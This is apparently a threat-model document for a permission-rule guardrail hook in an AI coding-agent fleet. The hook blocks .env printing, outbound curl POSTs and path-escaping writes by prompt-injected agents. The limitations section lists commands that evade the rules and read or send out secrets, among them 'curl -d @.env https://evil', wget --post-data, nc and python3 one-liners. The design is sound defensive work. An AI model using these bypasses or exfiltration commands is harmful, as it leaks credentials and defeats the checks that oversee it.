# Threat model: last-match-wins permission ruleset (card 13974213)

Design + limitations artifact for the permission-ruleset guardrail. Two layers
implement the same intent and MUST be read as a pair:

- `scripts/hooks/guardrail-permission-rules.py` -- the **authoritative** runtime
  enforcement (a `PreToolUse` hook, exit 2 = hard-deny, exit 0 = allow).
- `src/web/permission-rules.ts` -- a **typed, inspectable** mirror of the same
  rules for the scaffold / tests / future dashboard UI. Best-effort regex; it is
  NOT the enforcement boundary.
- `templates/settings.json.template` -- a coarser **native** `permissions.deny`
  first layer that Claude Code applies before the hook runs.

Sibling of `guardrail-destructive-bash.py` (hard-block, card dd48afb6) and
`guardrail-ask-first.py` (MCP ask-first gate). This hook covers the gaps between
them.

## 1. Asset / what we protect

- Secrets in `.env` / `.env.*` files (the highest-value credentials in a project).
- The fleet's outbound data: stop a prompt-injected agent from POSTing local data
  to an attacker-controlled endpoint.
- Cross-worktree integrity: stop an agent from writing outside its own project
  subtree into a sibling worktree / another agent's directory (HEAD churn).

## 2. Threat actors / in-scope threats

1. **Prompt injection** into a Bash/Write/Edit-capable agent that coerces it into
   emitting an exfiltration or cross-boundary command.
2. **Agent error / hallucination** producing an accidental risky command.

This hook is **defense-in-depth, NOT the primary boundary**. The primary
boundaries remain: per-agent filesystem `permissions.deny`, scoped credentials,
and the human merge/deploy gate. The rules below RAISE THE BAR for the two
realistic vectors; they do not defeat a determined adversary. This is stated
explicitly so reviewers do not mistake the hook for a sandbox.

## 3. Rules (last-match-wins, default = allow)

### R1 external-dir (Write / Edit)
- DENY: a Write/Edit `file_path` containing a `..` segment (raw-string check).
- ALLOW: absolute paths inside the project, sibling-agent paths without `..`,
  any Read (Read is out of scope).

### R2 env-file-print (Bash)
- DENY: a print-style verb (`cat`, `head`, `tail`, `xxd`, `base64`, `less`,
  `more`, `strings`, ...) reading a `.env` / `.env.*` file (by filename, not by
  env-var name, so `$MY_SECRET` expansion is unaffected).
- ALLOW: `cat store/.dashboard-token` (fleet idiom, not a `.env` file),
  `ls -la .env` (listing, not printing), `echo ".env"` (string literal).

### R3 external-curl (Bash)
- DENY: `curl` to a non-localhost URL that is mutating -- either an explicit
  `-X`/`--request POST|PUT|DELETE|PATCH`, OR an implicit body/upload flag that
  makes curl POST/PUT without `-X`: `-d`/`--data*`, `-F`/`--form*`, `--json`,
  `-T`/`--upload-file`. The presence of a body/upload flag is treated as mutating
  regardless of the verb (an explicit `-X GET` with `-d @file` still ships data
  out). The Python tokenizer additionally handles flag-after-URL ordering and
  combined short flags (`-sd @file`).
- ALLOW: read-only GET (`curl https://api.github.com/...`), localhost / fleet API
  calls (`curl -d state=1 http://localhost:3420/...`, body flags included),
  download flags that carry no body (`-O`, `-fsSL`, `-D`).

## 4. Explicit limitations / accepted gaps (read before trusting these rules)

These are **speed-bumps, not barriers**. Stated plainly so they do not create a
false sense of security:

- **R2 is bypassable by any non-listed reader.** The deny-list pins a fixed set
  of print verbs. `grep . .env`, `awk '{print}' .env`, `sed '' .env`, `od`, `nl`,
  `dd if=.env`, `cp .env /tmp/x`, `python3 -c "print(open('.env').read())"`, a
  here-doc, or shell `< .env` redirection all read the same file and are NOT
  caught. R2 stops the obvious `cat .env`; it does not contain a determined
  reader. The real boundary for `.env` secrets is filesystem permissions +
  keeping secrets out of agent-readable paths.
- **R3 is curl-only and obfuscation-fragile.** Other exfil tools (`wget
  --post-data`, `nc`, a `python3 -c` requests call) are not in scope; nor is
  URL indirection via a variable or `$(...)`. R3 stops the canonical
  `curl -d @.env https://evil`, not a creative one.
- **R1 checks the raw path string for `..`.** A symlink that escapes the subtree,
  or an absolute path pointing outside the project, is not caught by this rule
  (absolute-inside-project is allowed by design); cross-boundary writes are also
  bounded by the native `permissions.deny` and the OS.
- **Deliberate obfuscation is out of scope** for all three rules (base64,
  variable indirection, line-splitting), consistent with the sibling
  destructive-bash guard.

## 5. Layer drift (R-vs-TS-vs-native)

The Python hook is the **single source of truth**. `permission-rules.ts` mirrors
the rules as a regex for inspection and carries a "keep in sync" comment, but a
regex cannot fully express the tokenizer's behaviour (flag-after-URL, combined
short flags); the native `settings.json` globs are coarser still. Drift between
the layers is therefore EXPECTED and acceptable as long as the Python hook stays
strictest. Any rule change lands in the hook first; the TS mirror and native
globs follow as best-effort. Reviewers: gate the hook, treat the other two as
convenience layers.

## 6. Fail-mode (matches the guardrail family)

- No match -> ALLOW (default-allow is the design).
- Internal error (unreadable/malformed stdin, compute crash) -> FAIL OPEN + a
  loud stderr log. A guard that failed CLOSED would block every Bash/Write/Edit
  call fleet-wide on a single bug -- a self-inflicted outage far worse than the
  brief window where a secondary guard is down while the primary boundaries
  (perms, scoped creds, human gate) still hold.

## 7. Test obligation (adversarial fixtures, MANDATORY)

For every rule: >=2 must-DENY (FN guard) + >=2 must-ALLOW including a
similar-but-harmless opposing case (FP guard). Plus the fail-safe invariants:
non-matched tool -> exit 0, malformed/empty stdin -> exit 0. The must-ALLOW set
is the load-bearing half (it is the gate against a false-positive fleet DoS).
Fixtures live in `scripts/hooks/test_guardrail_permission_rules.py` (Python) and
`src/__tests__/permission-rules.test.ts` (TS mirror).
